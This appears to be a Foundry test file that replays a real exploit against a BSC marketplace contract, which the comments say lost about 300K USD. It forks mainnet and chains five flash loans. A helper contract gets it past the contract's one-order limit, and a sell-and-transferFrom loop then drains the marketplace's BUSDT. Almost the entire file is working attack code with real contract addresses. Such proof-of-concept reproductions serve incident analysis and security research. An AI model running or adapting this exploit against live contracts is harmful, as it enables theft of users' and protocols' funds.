// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~300K USD$
// Attacker : https://bscscan.com/address/0x0a3fee894eb8fcb6f84460d5828d71be50612762
// Attack Contract : https://bscscan.com/address/0x105e9b0266ae0ae670b7fe9af08cf32049f0dd21
// Vulnerable Contract : https://bscscan.com/address/0xb3a636ac4c271e6cd962cad98eae9cf71f5a49c8
// Attack Tx : https://bscscan.com/tx/0xd92bf51b9bf464420e1261cfcd8b291ee05d5fbffbfbb316ec95131779f80809

// @Analysis
// https://twitter.com/ImmuneBytes/status/1664239580210495489
// https://twitter.com/ChainAegis/status/1664192344726581255?cxt=HHwWjsDRldmHs5guAAAA

interface IMarketPlace {
    struct SellListing {
        uint256 itemId;
        uint256 index;
        uint256 price;
        uint256 amount;
        uint256 time;
        address buyer;
        address seller;
    }

    function currenyId() external view returns (uint256);

    function inviteLimit(address) external view returns (uint256);

    function items(uint256 id)
        external
        view
        returns (uint256 price, uint256 amount, uint256 totalAmount, uint256 index, uint256 time, address buyer);

    function listItem(uint256 _amount, address invite) external returns (uint256);

    function sellItem(uint256 _amount) external returns (SellListing memory);
}

contract DDTest is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 DD = IERC20(0x50ab0D88045F540b8B79C8A7Dc25790dB493BBC5);
    IDPPOracle DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IMarketPlace MarketPlace = IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant addrToInvite = 0x693166710b501e3379Cf104e5AaA803aF6CbbF1A;
    HelperContract OrdersPlacer;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_714_107);
        cheats.label(address(BUSDT), "BUSDT");
        cheats.label(address(DD), "DD");
        cheats.label(address(DPPOracle1), "DPPOracle1");
        cheats.label(address(DPPOracle2), "DPPOracle2");
        cheats.label(address(DPPOracle3), "DPPOracle3");
        cheats.label(address(DPP), "DPP");
        cheats.label(address(DPPAdvanced), "DPPAdvanced");
        cheats.label(address(MarketPlace), "MarketPlace");
        cheats.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint(
            "BUSDT attacker balance before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));

        emit log_named_decimal_uint(
            "BUSDT attacker balance after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle2)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
        } else if (msg.sender == address(DPP)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
        } else {
            // Approvals
            BUSDT.approve(address(MarketPlace), type(uint256).max);
            BUSDT.approve(address(Router), type(uint256).max);
            DD.approve(address(MarketPlace), type(uint256).max);

            // Placing order
            MarketPlace.listItem(500e18, addrToInvite);

            // Bypassing order limit. Next order should be placed with helper contract because:
            // MarketPlace: "Only one order can be placed within hours"
            // Here I don't use create2 method like it was in the attack tx
            OrdersPlacer = new HelperContract();
            BUSDT.transfer(address(OrdersPlacer), 500e18);
            // Using one contract to place the next order instead two (with delegatecall)
            OrdersPlacer.placeOrder();

            // Next part (for loop) may take some time...
            // More iterations possible. I just wanted to prcisely stick to the final (stealed) BUSDT amount
            for (uint256 i; i < 100; ++i) {
                (,, uint256 totalAmount,,,) = MarketPlace.items(MarketPlace.currenyId());

                swapBUSDTToDD(totalAmount / 20);
                MarketPlace.sellItem(totalAmount);
                BUSDT.transferFrom(
                    address(MarketPlace), address(this), BUSDT.allowance(address(MarketPlace), address(this))
                );
            }
        }

        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function swapBUSDTToDD(uint256 amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(DD);
        Router.swapTokensForExactTokens(
            amountOut, BUSDT.balanceOf(address(this)), path, address(this), block.timestamp + 100
        );
    }
}

contract HelperContract {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IMarketPlace MarketPlace = IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);

    function placeOrder() external {
        BUSDT.approve(address(MarketPlace), type(uint256).max);
        MarketPlace.listItem(500e18, msg.sender);
    }
}
